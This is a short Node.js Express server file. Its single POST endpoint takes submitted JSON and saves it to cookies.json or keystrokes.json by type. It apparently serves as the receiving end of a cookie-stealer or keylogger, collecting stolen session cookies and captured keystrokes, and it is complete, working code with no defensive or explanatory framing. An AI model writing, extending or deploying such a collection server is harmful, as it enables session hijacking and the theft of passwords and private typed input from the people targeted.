const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const port = 8080;

app.use(bodyParser.json());

// Helper function to append data to a file
function appendDataToFile(data, filename) {
  fs.readFile(filename, (err, fileData) => {
    let jsonData = [];
    if (!err) {
      try {
        jsonData = JSON.parse(fileData);
      } catch (e) {
        console.error('Error parsing JSON data:', e);
      }
    }
    jsonData.push(data);
    fs.writeFile(filename, JSON.stringify(jsonData, null, 2), err => {
      if (err) {
        console.error('Error writing to file:', err);
      }
    });
  });
}

// Endpoint to receive data
app.post('/data', (req, res) => {
  console.log('Data received:', req.body);
  if (req.body.type === 'cookies') {
    appendDataToFile(req.body, 'cookies.json');
  } else if (req.body.type === 'keystrokes') {
    appendDataToFile(req.body, 'keystrokes.json');
  }
  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
